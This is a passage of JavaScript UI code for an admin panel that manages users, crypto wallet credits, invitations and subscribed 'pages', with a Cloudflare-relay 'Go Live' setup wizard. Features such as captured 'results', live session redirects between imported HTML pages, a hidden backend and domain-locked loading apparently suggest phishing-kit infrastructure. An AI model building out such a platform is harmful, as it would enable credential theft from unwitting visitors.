  const reviewedFunding = adminDepositRequests.filter((request) => ["approved", "rejected"].includes(request.status)).slice(0, 5);
  const totalWallet = adminUsers.reduce((sum, user) => sum + Number(user.walletBalance || 0), 0);
  const totalPages = adminUsers.reduce((sum, user) => sum + (user.pages?.length || 0), 0);

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin user manager</small>
        <h2>Users and access</h2>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#wallet", "Wallet"),
        routeButton("#my-pages", "My Pages")
      ])}

      <div class="summary-grid">
        <article><small>Total users</small><b>${String(adminUsers.length).padStart(2, "0")}</b><span>User accounts</span></article>
        <article><small>Active</small><b>${String(activeCount).padStart(2, "0")}</b><span>Allowed access</span></article>
        <article><small>Wallet total</small><b>${formatMoney(totalWallet)}</b><span>All balances</span></article>
        <article><small>Pages</small><b>${String(totalPages).padStart(2, "0")}</b><span>${reviewCount} under review</span></article>
      </div>

      <article class="admin-package-card">
        <div>
          <small>operator controls</small>
          <h3>Manage users, wallet, pages, and privileges</h3>
          <p>Select a user page to extend days, reactivate expired access, enable admin-free subscription, or change auto-renew.</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-refresh-admin-users>Refresh users</button>
          <button type="button" data-export-admin-users>Export users</button>
        </div>
      </article>

      ${canManageAccounts ? `<article class="admin-table-card invite-manager">
        <div class="builder-heading">
          <div>
            <small>invite-only access</small>
            <h3>Registration invitations</h3>
          </div>
          <span class="invite-count">${adminInvitations.filter((invitation) => invitation.status === "pending").length} pending</span>
        </div>
        <div class="invite-create-grid">
          <label>
            <span>Email address</span>
            <input type="email" data-invite-email placeholder="new-user@example.com" autocomplete="off">
          </label>
          <label>
            <span>Link lifetime</span>
            <select data-invite-hours>
              <option value="24">24 hours</option>
              <option value="48" selected>48 hours</option>
              <option value="72">3 days</option>
              <option value="168">7 days</option>
            </select>
          </label>
          <button type="button" data-create-admin-invite>Create invite</button>
        </div>
        ${latestInvitationLink ? `
          <div class="invite-link-result">
            <div>
              <small>one-time link for ${escapeHtml(latestInvitationLink.email)}</small>
              <input type="text" value="${escapeHtml(latestInvitationLink.link)}" readonly aria-label="Latest invitation link">
            </div>
            <div class="admin-actions">
              <button type="button" data-copy-admin-invite>Copy link</button>
              <button type="button" data-email-admin-invite>Email draft</button>
            </div>
            <p>This raw link is shown only now. Creating another invite for the same email revokes the old pending link.</p>
          </div>
        ` : ""}
        <div class="invite-list">
          ${adminInvitations.length ? adminInvitations.slice(0, 20).map((invitation) => `
            <article>
              <div>
                <strong>${escapeHtml(invitation.email)}</strong>
                <span>Expires ${escapeHtml(invitationTime(invitation.expiresAt))}</span>
                <small>Created ${escapeHtml(invitationTime(invitation.createdAt))}</small>
              </div>
              <div class="invite-row-actions">
                <span class="invite-status invite-status-${escapeHtml(invitation.status)}">${escapeHtml(invitation.status)}</span>
                ${invitation.status === "pending" ? `<button type="button" data-revoke-admin-invite="${escapeHtml(invitation.id)}">Revoke</button>` : ""}
              </div>
            </article>
          `).join("") : `<p class="invite-empty">No invitations yet. Create one to enable a new signup.</p>`}
        </div>
      </article>` : ""}

      ${canReviewFunding ? `<article class="admin-table-card">
        <div class="builder-heading">
          <div>
            <small>crypto funding</small>
            <h3>Pending wallet credits</h3>
          </div>
          <button type="button" data-refresh-admin-users>Refresh</button>
        </div>
        <div class="fund-request-list">
          ${activeFunding.length ? activeFunding.map((request) => `
            <article>
              <div>
                <strong>${escapeHtml(request.userEmail || request.userName || request.userId)}</strong>
                <span>${escapeHtml(request.cryptoType)} / ${escapeHtml(request.network)} - ${formatMoney(request.amount)}</span>
                ${walletFundingQuoteSummary(request) ? `<em>${escapeHtml(walletFundingQuoteSummary(request))}</em>` : ""}
                <code>${escapeHtml(request.txHash)}</code>
                <small class="fund-status fund-status-${escapeHtml(request.status)}">${escapeHtml(request.status)}</small>
                <textarea data-fund-admin-note="${escapeHtml(request.id)}" placeholder="Admin note">${escapeHtml(request.adminNote || "")}</textarea>
              </div>
              <div class="fund-review-actions">
                <button type="button" data-review-wallet-fund="${escapeHtml(request.id)}">Reviewing</button>
                <button type="button" data-approve-wallet-fund="${escapeHtml(request.id)}">Approve</button>
                <button type="button" data-reject-wallet-fund="${escapeHtml(request.id)}">Reject</button>
              </div>
            </article>
          `).join("") : `
            <article>
              <div>
                <strong>No pending funding</strong>
                <span>Submitted crypto payments will appear here.</span>
              </div>
            </article>
          `}
        </div>
        ${reviewedFunding.length ? `
          <div class="fund-history-list">
            ${reviewedFunding.map((request) => `
              <div>
                <span>${escapeHtml(request.userEmail || request.userName || request.userId)}</span>
                <b>${formatMoney(request.amount)}</b>
                <small class="fund-status fund-status-${escapeHtml(request.status)}">${escapeHtml(request.status)}</small>
              </div>
            `).join("")}
          </div>
        ` : ""}
      </article>` : ""}

      <article class="admin-table-card">
        <div class="builder-heading">
          <div>
            <small>user directory</small>
            <h3>Accounts</h3>
          </div>
          <button type="button" data-refresh-admin-users>Refresh</button>
        </div>
        <div class="user-manager-list">
          ${adminUsers.length ? adminUsers.map((user) => {
            const initials = user.name.split(" ").map((part) => part[0]).join("").slice(0, 2).toUpperCase() || "US";
            const selectedPage = user.pages?.[0] || null;
            const isExpanded = expandedAdminUsers.has(user.id);
            const collabsOpen = collabAdminUsers.has(user.id);
            const collab = user.collaboration || {};
            const recentSpendRows = (user.recentTransactions || []).slice(0, 3);
            return `
            <article class="admin-user-card">
              <div class="user-avatar">${escapeHtml(initials)}</div>
              <div class="user-copy">
                <strong>${escapeHtml(user.name)}</strong>
                <span>${escapeHtml(user.email)}</span>
              </div>
              <div class="user-tags">
                <span>${escapeHtml(user.role)}</span>
                <span>${escapeHtml(user.status)}</span>
                <span>${formatMoney(user.walletBalance)}</span>
                <span>Spent ${formatMoney(user.spend?.totalSpent || 0)}</span>
                <span>${user.pages.length} pages</span>
                ${collab.enabled ? "<span>Collab on</span>" : ""}
              </div>
              <div class="user-actions admin-user-actions">
                <button type="button" data-admin-user-expand="${escapeHtml(user.id)}">${isExpanded ? "Collapse" : "Expand"}</button>
                ${canManageAccounts ? `<button type="button" data-admin-user-collabs="${escapeHtml(user.id)}">${collabsOpen ? "Hide collabs" : "Collabs"}</button>` : ""}
              </div>

              ${isExpanded ? `
              ${canManageAccounts ? `<div class="admin-user-controls">
                <label>
                  <span>Role</span>
                  <select data-admin-user-field="role" data-admin-user="${escapeHtml(user.id)}">
                    ${["subscriber", "support", "admin"].map((role) => `<option value="${role}" ${String(user.role).toLowerCase() === role ? "selected" : ""}>${role}</option>`).join("")}
                  </select>
                </label>
                <label>
                  <span>Status</span>
                  <select data-admin-user-field="status" data-admin-user="${escapeHtml(user.id)}">
                    ${["active", "review", "suspended"].map((status) => `<option value="${status}" ${String(user.status).toLowerCase() === status ? "selected" : ""}>${status}</option>`).join("")}
                  </select>
                </label>
                <button type="button" data-save-admin-user="${escapeHtml(user.id)}">Save access</button>
              </div>` : ""}

              <div class="admin-user-controls admin-spend-control">
                <div>
                  <span>Total spent</span>
                  <strong>${formatMoney(user.spend?.totalSpent || 0)}</strong>
                </div>
                <div>
                  <span>Subscriptions</span>
                  <strong>${formatMoney(user.spend?.subscriptionSpend || 0)}</strong>
                </div>
                <div>
                  <span>Total funded</span>
                  <strong>${formatMoney(user.spend?.totalFunded || 0)}</strong>
                </div>
                <div>
                  <span>Crypto funded</span>
                  <strong>${formatMoney(user.spend?.cryptoFunded || 0)}</strong>
                </div>
                ${recentSpendRows.length ? `
                  <section class="admin-recent-spend">
                    ${recentSpendRows.map((transaction) => `
                      <div>
                        <span>${escapeHtml(transaction.type || "transaction")}</span>
                        <b class="${Number(transaction.amount || 0) < 0 ? "is-negative" : "is-positive"}">${formatMoney(transaction.amount || 0)}</b>
                        <small>${escapeHtml(walletHistoryDate(transaction.createdAt))}</small>
                      </div>
                    `).join("")}
                  </section>
                ` : ""}
              </div>

              ${canAdjustWallets ? `<div class="admin-user-controls wallet-control">
                <label><span>Wallet amount</span><input type="number" step="0.01" data-admin-wallet-amount="${escapeHtml(user.id)}" placeholder="100"></label>
                <label><span>Note</span><input type="text" data-admin-wallet-note="${escapeHtml(user.id)}" placeholder="Manual credit / correction"></label>
                <button type="button" data-admin-wallet-credit="${escapeHtml(user.id)}">Credit</button>
                <button type="button" data-admin-wallet-debit="${escapeHtml(user.id)}">Debit</button>
              </div>` : ""}

              ${canEditUserPages ? `<div class="admin-user-controls page-control">
                <label>
                  <span>User page</span>
                  <select data-admin-page-select="${escapeHtml(user.id)}">
                    ${user.pages.length ? user.pages.map((page) => `<option value="${escapeHtml(page.id)}">${escapeHtml(page.name)} / ${escapeHtml(page.subscription?.renewalDate || "no renewal")}</option>`).join("") : '<option value="">No pages</option>'}
                  </select>
                </label>
                <label><span>Extend days</span><input type="number" min="1" max="365" data-admin-page-days="${escapeHtml(user.id)}" value="7"></label>
                <label class="toggle-row"><input type="checkbox" data-admin-page-free="${escapeHtml(user.id)}" ${selectedPage?.subscription?.adminFreeSubscription ? "checked" : ""}><span>Admin free</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-page-autorenew="${escapeHtml(user.id)}" ${selectedPage?.subscription?.autoRenew ? "checked" : ""}><span>Auto renew</span></label>
                <button type="button" data-admin-page-extend="${escapeHtml(user.id)}">Extend / Reactivate</button>
              </div>` : ""}
              ` : ""}

              ${collabsOpen && canManageAccounts ? `
              <div class="admin-user-controls collab-control">
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="enabled" data-admin-collab="${escapeHtml(user.id)}" ${collab.enabled ? "checked" : ""}><span>Enable collab access</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="pageEditor" data-admin-collab="${escapeHtml(user.id)}" ${collab.pageEditor ? "checked" : ""}><span>Page editor</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="supportAccess" data-admin-collab="${escapeHtml(user.id)}" ${collab.supportAccess ? "checked" : ""}><span>Support access</span></label>
                <label class="toggle-row"><input type="checkbox" data-admin-collab-field="walletReview" data-admin-collab="${escapeHtml(user.id)}" ${collab.walletReview ? "checked" : ""}><span>Wallet review</span></label>
                <label><span>Collab note</span><input type="text" data-admin-collab-note="${escapeHtml(user.id)}" value="${escapeHtml(collab.note || "")}" placeholder="Scope, team, or restriction"></label>
                <button type="button" data-save-admin-user="${escapeHtml(user.id)}">Save collabs</button>
              </div>
              ` : ""}
            </article>
          `;
          }).join("") : emptyState("No users loaded", "Refresh users or check admin API access.", "#admin-users")}
        </div>
      </article>

      <div class="admin-grid">
        <article class="security-panel">
          <small>role options</small>
          <h3>Access levels</h3>
          <div class="admin-rule-list">
            <div><strong>01</strong><span>Subscriber: can subscribe, configure owned pages, download index.html.</span></div>
            <div><strong>02</strong><span>Support: can view users and help with domains/security but cannot publish packages.</span></div>
            <div><strong>03</strong><span>Admin: can manage packages, users, wallet corrections, and publishing.</span></div>
          </div>
        </article>

        <article class="security-panel">
          <small>security options</small>
          <h3>User safety controls</h3>
          <div class="feature-row">
            <span>Suspend account</span>
            <span>Ban IP</span>
            <span>Whitelist IP</span>
            <span>Reset login</span>
            <span>Pause renewals</span>
            <span>Force CAPTCHA</span>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = "ADMIN USER MANAGER READY";
  topbarTitle.textContent = "User Manager";
}

function pageTrafficCount(page) {
  const logCount = page.securityConfig?.trafficLog?.length;
  if (Number.isFinite(logCount) && logCount > 0) return logCount;
  const numericTraffic = String(page.traffic || "").match(/\d+/);
  return numericTraffic ? Number(numericTraffic[0]) : 0;
}

function pageLaunchReadiness(page) {
  const checks = [
    Boolean(page.subscription?.billingPeriod),
    Boolean(page.hostingConfig?.domain || page.domain),
    Boolean(page.hostingConfig?.serverIp),
    Boolean(page.generatedFile?.lastGeneratedAt || page.generatedFile?.version)
  ];
  const passed = checks.filter(Boolean).length;
  return {
    passed,
    total: checks.length,
    percent: Math.round((passed / checks.length) * 100)
  };
}

function pageRiskSignal(page) {
  const routeKey = pageRouteKey(page);
  const hosting = page.hostingConfig || {};
  const security = page.securityConfig || {};
  const generated = page.generatedFile || {};
  const renewal = subscriptionState(page);
  const domain = hosting.domain || page.domain || "";
  const serverIp = hosting.serverIp || hosting.origin || hosting.relayTarget || "";
  const connectionType = hosting.connectionType || "cloudflare-worker";
  const workerReady = connectionType !== "cloudflare-worker" || Boolean(hosting.cloudflare?.routePattern || hosting.workerRoute || hosting.relayVerified);
  const generatedReady = Boolean(generated.lastGeneratedAt || generated.version);
  const allowedDomains = (security.domains || []).map(normalizeAllowedHost).filter(Boolean);
  const domainAllowed = !domain || !allowedDomains.length || allowedDomains.includes(normalizeAllowedHost(domain));
  const issues = [];

  if (renewal.expired || renewal.paymentFailed) {
    issues.push({
      severity: "red",
      layer: "Subscription",
      code: renewal.paymentFailed ? "PAYMENT_FAILED" : "SUBSCRIPTION_EXPIRED",
      detail: "Runtime access can stop until the page is renewed.",
      fix: "#wallet",
      action: "Fund wallet"
    });
  }

  if (!domain) {
    issues.push({
      severity: "red",
      layer: "Domain",
      code: "DOMAIN_MISSING",
      detail: "No live domain is connected to this page.",
      fix: `#config-${routeKey}`,
      action: "Set domain"
    });
  } else if (!domainAllowed) {
    issues.push({
      severity: "red",
      layer: "Security",
      code: "DOMAIN_NOT_ALLOWED",
      detail: "Saved security domains do not include the live domain.",
      fix: `#security-${routeKey}`,
      action: "Fix allowlist"
    });
  }

  if (!serverIp) {
    issues.push({
      severity: "yellow",
      layer: "Host",
      code: "HOST_ORIGIN_MISSING",
      detail: "No host/origin target is saved for live relay checks.",
      fix: `#go-live-${routeKey}`,
      action: "Open Go Live"
    });
  }

  if (!workerReady) {
    issues.push({
      severity: "yellow",
      layer: "Cloudflare",
      code: "WORKER_NOT_VERIFIED",
      detail: "Worker route or relay verification is not complete.",
      fix: `#go-live-${routeKey}`,
      action: "Verify route"
    });
  }

  if (!generatedReady) {
    issues.push({
      severity: "yellow",
      layer: "Runtime",
      code: "INDEX_NOT_GENERATED",
      detail: "Runtime index has not been generated after setup.",
      fix: `#go-live-${routeKey}`,
      action: "Generate"
    });
  }

  if (hosting.liveStatus && /flag|red|blocked|suspend|down|fail|error/i.test(hosting.liveStatus)) {
    issues.push({
      severity: "red",
      layer: "Live status",
      code: "LIVE_STATUS_RED",
      detail: hosting.liveStatus,
      fix: `#go-live-${routeKey}`,
      action: "Inspect"
    });
  }

  const topIssue = issues.find((issue) => issue.severity === "red") || issues[0] || null;
  const status = topIssue?.severity || "green";
  return {
    status,
    label: status === "red" ? "Red" : status === "yellow" ? "Watch" : "Green",
    layer: topIssue?.layer || "Live",
    code: topIssue?.code || "LIVE_READY",
    detail: topIssue?.detail || "No operational issues detected from saved app data.",
    action: topIssue?.action || "Open",
    fix: topIssue?.fix || `#go-live-${routeKey}`,
    issues
  };
}

function myPagePrimaryAction(page, renewal, risk, readiness) {
  const routeKey = pageRouteKey(page);
  if (renewal.paymentFailed) return { type: "renew", target: routeKey, label: "Fund and renew", tone: "danger" };
  if (renewal.expired) return { type: "renew", target: routeKey, label: "Restore page", tone: "danger" };
  if (renewal.dueSoon) return { type: "renew", target: routeKey, label: "Renew now", tone: "warning" };
  if (risk.status === "red") {
    return {
      type: "route",
      target: risk.fix || `#security-${routeKey}:security`,
      label: risk.action || "Fix issue",
      tone: "danger"
    };
  }
  if (risk.status === "yellow" || readiness.percent < 100 || !page.hostingConfig?.verified) {
    return {
      type: "route",
      target: risk.fix || `#go-live-${routeKey}`,
      label: "Continue setup",
      tone: "warning"
    };
  }
  return { type: "results", target: routeKey, label: "View results", tone: "success" };
}

function myPagePrimaryActionAttribute(action) {
  if (action.type === "renew") return `data-renew-page="${escapeHtml(action.target)}"`;
  if (action.type === "results") return `data-results="${escapeHtml(action.target)}"`;
  return `data-route="${escapeHtml(action.target)}"`;
}

function ownedPageCard(page) {
  const routeKey = pageRouteKey(page);
  const readiness = pageLaunchReadiness(page);
  const risk = pageRiskSignal(page);
  const hosting = page.hostingConfig || {};
  const liveStatus = hosting.liveStatus || (hosting.verified ? "Live" : hosting.serverIp ? "Ready to verify" : "Setup needed");
  const liveHost = normalizeAllowedHost(hosting.domain || page.domain || "");
  const liveUrl = liveHost ? `https://${liveHost}/` : "";
  const billing = page.subscription?.billingPeriod
    ? `${billingLabel(page.subscription.billingPeriod)} / ${formatMoney(page.subscription.renewalPrice || 0)}`
    : "Billing not set";
  const renewal = subscriptionState(page);
  const securityLabel = page.securityConfig?.captcha ? "Captcha on" : "Captcha off";
  const trafficCount = pageTrafficCount(page);
  const resultCount = page.results?.length || 0;
  const generatedLabel = page.generatedFile?.lastGeneratedAt ? "Generated" : page.generatedFile?.version || "Not generated";
  const renewButtonLabel = renewal.paymentFailed ? "Fund and renew" : renewal.expired ? "Restore page" : "Renew now";
  const healthLabel = risk.status === "red" ? "Needs attention" : risk.status === "yellow" ? "Setup needed" : "Healthy";
  const primaryAction = myPagePrimaryAction(page, renewal, risk, readiness);
  const goLiveDisabled = disabledPageCapabilityAttributes(page, "goLive");
  const configDisabled = disabledPageCapabilityAttributes(page, "editConfig");
  const securityDisabled = disabledPageCapabilityAttributes(page, "editSecurity");

  return `
    <article class="owned-page-card my-page-card">
      <header class="my-page-overview">
        <div class="my-page-identity">
          <small>${escapeHtml(page.status || "active")}</small>
          <h3>${escapeHtml(page.name)}</h3>
          <div class="my-page-chips">
            <span class="subscription-chip ${renewal.className}">${escapeHtml(renewal.label)}</span>
            <span class="risk-chip is-${risk.status}">${escapeHtml(risk.layer)}</span>
          </div>
        </div>
        <div class="my-page-health is-${risk.status}" aria-label="Page health: ${escapeHtml(healthLabel)}">
          <small>Page health</small>
          <strong>${escapeHtml(healthLabel)}</strong>
          <span>${readiness.percent}% ready</span>
        </div>
        <div class="my-page-live-url">
          <small>Live URL</small>
          ${liveUrl
            ? `<a href="${escapeHtml(liveUrl)}" target="_blank" rel="noopener noreferrer">${escapeHtml(liveHost)}</a>`
            : "<strong>Not connected</strong>"}
          <span>${escapeHtml(hosting.verified ? "Connected" : liveStatus)}</span>
        </div>
        <button type="button" class="my-page-primary-action is-${primaryAction.tone}" ${myPagePrimaryActionAttribute(primaryAction)}>${escapeHtml(primaryAction.label)}</button>
      </header>

      <div class="my-page-folds" aria-label="${escapeHtml(page.name)} management sections">
        <details class="my-page-fold" data-page-section="hosting">
          <summary>
            <span><small>Hosting</small><strong>${escapeHtml(liveStatus)}</strong></span>
            <em>${escapeHtml(generatedLabel)}</em>
          </summary>
          <div class="my-page-fold-body">
            <div class="my-page-facts">
              <div><span>Domain</span><strong>${escapeHtml(liveHost || "Not connected")}</strong></div>
              <div><span>Plan</span><strong>${escapeHtml(billing)}</strong></div>
              <div><span>Renewal</span><strong>${escapeHtml(renewal.dueLabel)}</strong></div>
            </div>
            <div class="my-page-secondary-actions">
              <button type="button" data-go-live="${escapeHtml(routeKey)}"${goLiveDisabled}>Go Live</button>
              <button type="button" data-config-page="${escapeHtml(routeKey)}"${configDisabled}>Configuration</button>
              ${renewal.canRenew ? `<button type="button" data-renew-page="${escapeHtml(routeKey)}">${escapeHtml(renewButtonLabel)}</button>` : ""}
            </div>
          </div>
        </details>

        <details class="my-page-fold" data-page-section="advanced-security">
          <summary>
            <span><small>Advanced security</small><strong>${escapeHtml(securityLabel)}</strong></span>
            <em>${escapeHtml(risk.code)}</em>
          </summary>
          <div class="my-page-fold-body">
            <p>${escapeHtml(risk.detail)}</p>
            <div class="my-page-secondary-actions">
              <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="security"${securityDisabled}>Security settings</button>
            </div>
          </div>
        </details>

        <details class="my-page-fold" data-page-section="results">
          <summary>
            <span><small>Result controls</small><strong>${resultCount} saved result${resultCount === 1 ? "" : "s"}</strong></span>
            <em>${trafficCount} visits</em>
          </summary>
          <div class="my-page-fold-body">
            <div class="my-page-secondary-actions">
              <button type="button" data-results="${escapeHtml(routeKey)}">Open results</button>
              <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="traffic">Traffic</button>
              <button type="button" data-page-log="${escapeHtml(routeKey)}">Page log</button>
            </div>
          </div>
        </details>
      </div>
    </article>
  `;
}

function renderMyPages() {
  activeFlowSlug = null;
  preview.innerHTML = `
    <section class="app-view my-pages-view">
      <header class="my-pages-header">
        <div>
          <small>my pages</small>
          <h2>Subscribed pages</h2>
          <p>${ownedPages.length} page${ownedPages.length === 1 ? "" : "s"}</p>
        </div>
        ${viewNav([
          routeButton("#dashboard", "Dashboard"),
          routeButton("#pages", "Browse pages")
        ])}
      </header>

      <div class="owned-list">
        ${ownedPages.length ? ownedPages.map(ownedPageCard).join("") : emptyState("No subscribed pages yet", "Subscribe to a published page package, then your live page controls will appear here.", "#pages")}
      </div>
    </section>
  `;
  statusText.textContent = "MY PAGES MANAGEMENT ACTIVE";
  topbarTitle.textContent = "My Pages";
}

function renderGoLiveCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const routeKey = pageRouteKey(page);
  const hosting = page.hostingConfig || {};
  const verifiedLabel = hosting.verified ? "Verified" : "Not verified";
  const liveStatus = hosting.liveStatus || "Setup required";
  const domain = hosting.domain || page.domain || "";
  const serverIp = hosting.serverIp || "";
  const hostingType = hosting.hostingType || "render-static-site";
  const isRenderStatic = hostingType === "render-static-site";
  const installPath = hosting.installPath || (isRenderStatic ? "root / public directory" : "public_html");
  const connectionType = hosting.connectionType || "cloudflare-worker";
  const relaySecret = "";
  const relaySecretConfigured = Boolean(hosting.relaySecretConfigured || hosting.relaySecret);
  const relayTarget = hosting.relayTarget || apiBase();
  const cloudflare = hosting.cloudflare || {};
  const managedInstalled = Boolean(cloudflare.managed && cloudflare.routePattern);
  const zoneVerified = Boolean(cloudflare.zoneId && cloudflare.verifiedAt);
  const workerRoute = domain ? `${domain}/api/*` : "clientdomain.com/api/*";
  const hasDomain = Boolean(domain);
  const hasRenderOrigin = Boolean(serverIp);
  const hasRelayTarget = Boolean(relayTarget);
  const hasRelaySecret = relaySecretConfigured;
  const usesManagedWorker = connectionType === "cloudflare-worker";
  const hasWorkerRoute = !usesManagedWorker || managedInstalled;
  const hasVerified = Boolean(hosting.verified);
  const connectionReadyToDownload = hasDomain && hasRelayTarget && (usesManagedWorker ? hasRelaySecret && managedInstalled : true);
  const displayDomain = domain || "clientdomain.com";
  const pagePackage = packageForUserPage(page);
  const runtimeEntryFile = packageEntryFile(pagePackage);
  const runtimeTargets = sessionPageTargets(page);
  const runtimeSourceReady = shouldUsePackageRuntime(page, pagePackage)
    ? Boolean(runtimeEntryFile)
    : Boolean((page.flow || []).length || runtimeEntryFile);
  const readyToDownload = connectionReadyToDownload && runtimeSourceReady;
  const downloadBlockers = [
    !hasDomain ? "live domain" : "",
    !hasRelayTarget ? "API relay target" : "",
    usesManagedWorker && !hasRelaySecret ? "relay secret" : "",
    usesManagedWorker && !managedInstalled ? "installed Worker route" : "",
    !runtimeSourceReady ? "imported entry HTML page" : ""
  ].filter(Boolean);
  const resultsEndpointReady = Boolean(page.id && hasRelayTarget);
  const goLiveChecks = [
    {
      label: "Live domain",
      done: hasDomain,
      detail: hasDomain ? `${displayDomain} is the only allowed hostname.` : "Set the user's live domain in Config."
    },
    {
      label: "Relay secret",
      done: !usesManagedWorker || hasRelaySecret,
      detail: !usesManagedWorker ? "Not required for this connection type." : hasRelaySecret ? "Runtime API calls can be relayed privately." : "Generate the relay secret before Worker install."
    },
    {
      label: "Worker installed",
      done: hasWorkerRoute,
      detail: hasWorkerRoute ? `${workerRoute} is installed.` : "Install the managed Cloudflare Worker route."
    },
    {
      label: "Runtime pages",
      done: runtimeSourceReady,
      detail: runtimeSourceReady ? `Entry page ${runtimeEntryFile || "configured flow"} is available.` : "Import must include an entry HTML file or configured flow."
    },
    {
      label: "Session redirects",
      done: runtimeTargets.length > 0,
      detail: runtimeTargets.length ? `${runtimeTargets.length} page target${runtimeTargets.length === 1 ? "" : "s"} mapped for live sessions.` : "Map HTML pages so active sessions can be redirected."
    },
    {
      label: "Results endpoint",
      done: resultsEndpointReady,
      detail: resultsEndpointReady ? "Submissions and page events can sync to this user page." : "Runtime API target is not ready yet."
    },
    {
      label: "Index downloaded",
      done: Boolean(page.generatedFile?.lastGeneratedAt),
      detail: page.generatedFile?.lastGeneratedAt ? "The generated launcher is ready to deploy." : readyToDownload && runtimeSourceReady ? "Download index.html before configuring the static host URL." : "Complete domain, relay, Worker, and runtime checks first."
    },
    {
      label: "Raw host URL",
      done: hasRenderOrigin,
      detail: hasRenderOrigin ? "The static host deployment URL is saved." : "Deploy index.html, then add the URL supplied by the static host."
    },
    {
      label: "Final connection",
      done: hasVerified,
      detail: hasVerified ? `https://${displayDomain}/ is marked connected.` : "Connect the custom domain, keep Cloudflare proxied, then mark the connection verified."
    }
  ];
  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>go live setup</small>
        <h2>${page.name} activation</h2>
        <p>Follow the steps in order. The page is strict live-domain only: it loads on ${displayDomain}, while backend traffic stays behind a domain relay.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#config-${routeKey}`, "Config")
      ])}

      <div class="summary-grid go-live-summary">
        <article><small>Live status</small><b>${liveStatus}</b><span>${verifiedLabel}</span></article>
        <article><small>Domain</small><b>${domain || "Unset"}</b><span>Allowed host</span></article>
        <article><small>Hosting</small><b>${hostingTypeLabel(hostingType)}</b><span>${hosting.relayVerified ? "Verified" : "Needs check"}</span></article>
        <article><small>Route</small><b>${workerRoute}</b><span>Worker path</span></article>
      </div>

      <div class="wizard-progress go-live-progress">
        <span class="${setupStepClass(hasDomain, true)}">1 Domain</span>
        <span class="${setupStepClass(hasRelaySecret, hasDomain && !hasRelaySecret)}">2 Secret</span>
        <span class="${setupStepClass(hasWorkerRoute, hasRelaySecret && !hasWorkerRoute)}">3 Worker</span>
        <span class="${setupStepClass(page.generatedFile?.lastGeneratedAt, readyToDownload)}">4 Download</span>
        <span class="${setupStepClass(hasRenderOrigin, page.generatedFile?.lastGeneratedAt && !hasRenderOrigin)}">5 Host</span>
        <span class="${setupStepClass(hasVerified, hasRenderOrigin && !hasVerified)}">6 Verify</span>
      </div>

      ${goLiveChecklistMarkup(goLiveChecks)}

      <div class="go-live-steps">
        <article class="security-panel package-form go-live-step-card ${hasDomain ? "is-complete" : "is-active"}">
          <small>step 1</small>
          <h3>Confirm the live domain</h3>
          <p>The domain is managed in Config. Go Live uses that saved domain as the only hostname where the downloaded page is allowed to run.</p>
          <div class="admin-code-sample">
            <code>Live domain: ${escapeHtml(domain || "Not configured")}</code>
            <code>Allowed URL: https://${escapeHtml(displayDomain)}/</code>
          </div>
          <label>
            <span>Connection type</span>
            <select data-hosting-field="connectionType">
              ${[
                ["cloudflare-worker", "Cloudflare Worker Relay"],
                ["direct-api", "Direct API"],
                ["server-proxy", "Server proxy"]
              ].map(([value, label]) => `<option value="${value}" ${connectionType === value ? "selected" : ""}>${label}</option>`).join("")}
            </select>
          </label>
          <div class="admin-actions">
            <button type="button" data-route="#config-${routeKey}">Open Config</button>
            <button type="button" data-save-hosting="${routeKey}">Save connection type</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${hasRelaySecret ? "is-complete" : hasDomain ? "is-active" : ""}">
          <small>step 2</small>
          <h3>Generate relay secret</h3>
          <p>This secret is stored in the Cloudflare Worker only. It lets your backend reject direct runtime traffic.</p>
          <div class="traffic-log">
            <div><span>01</span><strong>Secret</strong><em>${hasRelaySecret ? "Saved" : "Needed"}</em><small>${hasRelaySecret ? "Ready for managed Worker install." : "Generate before installing the Worker route."}</small></div>
            <div><span>02</span><strong>Relay</strong><em>Hidden backend</em><small>Cloudflare forwards runtime calls privately.</small></div>
          </div>
          <div class="admin-actions">
            <button type="button" data-generate-relay-secret="${routeKey}">${hasRelaySecret ? "Rotate secret" : "Generate secret"}</button>
          </div>
        </article>

        <article class="security-panel package-form go-live-step-card ${managedInstalled ? "is-complete" : hasRelaySecret ? "is-active" : ""}">
          <small>step 3</small>
          <h3>Install Cloudflare relay</h3>
          <p>Paste a limited Cloudflare token once. The app installs the Worker and route for <strong>${workerRoute}</strong>, then stores only deployment status.</p>
          <label><span>Cloudflare account ID</span><input type="text" data-cloudflare-field="accountId" value="${escapeHtml(cloudflare.accountId || "")}" placeholder="Account ID from Cloudflare dashboard"></label>
          <label><span>Cloudflare API token</span><input type="password" data-cloudflare-field="apiToken" value="" placeholder="Used once. Not saved by the app."></label>
          <label><span>Worker script name</span><input type="text" data-cloudflare-field="scriptName" value="${escapeHtml(cloudflare.scriptName || `deuce-${displayDomain.replace(/[^a-z0-9-]/gi, "-").toLowerCase()}`)}"></label>
          <div class="admin-code-sample">
            <code>Managed route: ${escapeHtml(cloudflare.routePattern || workerRoute)}</code>
            <code data-cloudflare-install-status>Status: ${managedInstalled ? "Installed by app" : zoneVerified ? "Zone verified - ready to install" : "Waiting for zone verification"}</code>
            <code>Browser calls: https://${displayDomain}/api/*</code>
          </div>
          <div class="admin-actions">
            <button type="button" data-install-cloudflare="${routeKey}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
            <button type="button" data-verify-cloudflare="${routeKey}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${page.generatedFile?.lastGeneratedAt ? "is-complete" : readyToDownload ? "is-active" : ""}">
          <small>step 4</small>
          <h3>Download final index.html</h3>
